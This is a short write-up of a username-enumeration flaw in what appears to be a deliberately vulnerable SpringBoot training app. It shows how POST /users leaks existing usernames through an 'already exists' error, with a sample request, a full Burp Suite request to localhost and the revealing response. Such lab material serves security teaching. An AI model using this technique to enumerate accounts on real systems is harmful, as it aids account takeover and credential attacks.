# Brute-Force Valid Username
A type of brute force attack that finds valid usernames (usernames of existing accounts) not belonging to the attacker.

## Exploitation
**Prerequisites:** _None_

**Location:** _POST /users_

Brute-Force valid username present within SpringBoot code by application returning if the username belongs to an existing account.  Below is an exploitation example:

    POST /users
    raw:
    {
        "username" : "admin",
        "password" : "password"
    }
    
Burp Suite, ZAP, or equivalent technologies can be used to automate brute-forcing attempts against the web application using the general format above.

Successful exploitation looks like:

    {
        "success": false,
        "code": 400,
        "message": "Username already exists"
    }

## Burp Suite Example Exploitation

    POST /users HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 44
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    Content-Type: application/json
    X-XSRF-TOKEN: e83a563e-ef3e-42c2-a1b7-73ad1da6296c
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=e83a563e-ef3e-42c2-a1b7-73ad1da6296c
    Connection: close

    {"username":"admin","password":"password1!"}
    
